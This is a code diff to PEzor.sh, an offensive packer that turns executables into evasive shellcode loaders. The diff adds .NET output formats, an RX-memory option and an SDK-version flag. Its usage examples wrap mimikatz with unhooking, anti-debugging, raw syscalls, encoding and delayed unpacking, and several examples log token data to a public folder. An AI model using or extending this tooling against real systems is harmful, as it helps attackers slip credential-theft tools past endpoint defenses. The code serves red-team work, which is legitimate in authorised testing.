@@ -29,6 +29,7 @@ ANTIDEBUG=false
 TEXT=false
 SELF=false
 RX=false
+SDK=4.5
 CC=x86_64-w64-mingw32-clang
 CXX=x86_64-w64-mingw32-clang++
 OUTPUT_FORMAT=exe
@@ -53,14 +54,18 @@ OPTIONS
   -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]
   -sgn                      Encode the generated shellcode with sgn
   -text                     Store shellcode in .text section instead of .data
-  -self                     Execute the shellcode in the same thread [requires RX shellcode, not compatible with -sgn]
+  -rx                       Allocate RX memory for shellcode
+  -self                     Execute the shellcode in the same thread
+  -sdk=VERSION              Use specified .NET Framework version (2, 4, 4.5 (default))
   -sleep=N                  Sleeps for N seconds before unpacking the shellcode
-  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll)
+  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
   [donut args...]           After the executable to pack, you can pass additional Donut args, such as -z 2
 
 EXAMPLES
-  # 64-bit (self-inject)
+  # 64-bit (self-inject RWX)
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/x64/mimikatz.exe -z 2
+  # 64-bit (self-inject RX)
+  $ PEzor.sh -unhook -antidebug -text -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2
   # 64-bit (raw syscalls)
   $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 mimikatz/x64/mimikatz.exe -z 2
   # 64-bit (reflective dll)
@@ -69,6 +74,10 @@ EXAMPLES
   $ PEzor.sh -format=service-exe mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (service dll)
   $ PEzor.sh -format=service-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  # 64-bit (dotnet)
+  $ PEzor.sh -format=dotnet -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  # 64-bit (dotnet-pinvoke)
+  $ PEzor.sh -format=dotnet-pinvoke -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 32-bit (self-inject)
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
   # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
@@ -88,9 +97,10 @@ OPTIONS
   -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]
   -sgn                      Encode the provided shellcode with sgn
   -text                     Store shellcode in .text section instead of .data
+  -rx                       Allocate RX memory for shellcode
   -self                     Execute the shellcode in the same thread [requires RX shellcode, not compatible with -sgn]
   -sleep=N                  Sleeps for N seconds before unpacking the shellcode
-  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll)
+  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
 
 EXAMPLES
   # 64-bit (self-inject)
@@ -180,6 +190,10 @@ do
         -format=*)
             OUTPUT_FORMAT="${arg#*=}"
             echo "[?] Output format: $OUTPUT_FORMAT"
+            ;;
+        -sdk=*)
+            SDK="${arg#*=}"
+            echo "[?] .NET SDK: $SDK"
             ;;
         *)
             echo "[?] Processing $arg"
@@ -387,7 +401,12 @@ case $OUTPUT_FORMAT in
             echo -n '};' >> $TMP_DIR/Global.cs
         fi
         echo '}' >> $TMP_DIR/Global.cs
-        DOTNET_FLAGS="-unsafe -optimize- -debug- -sdk:4"
+        DOTNET_FLAGS="-unsafe -debug-"
+
+        if [ ! $SDK = "4.5" ]; then
+            DOTNET_FLAGS="$DOTNET_FLAGS -sdk:$SDK"
+        fi
+
         if [ $BITS -eq 32 ]; then
             DOTNET_FLAGS="$DOTNET_FLAGS -platform:x86"
         else
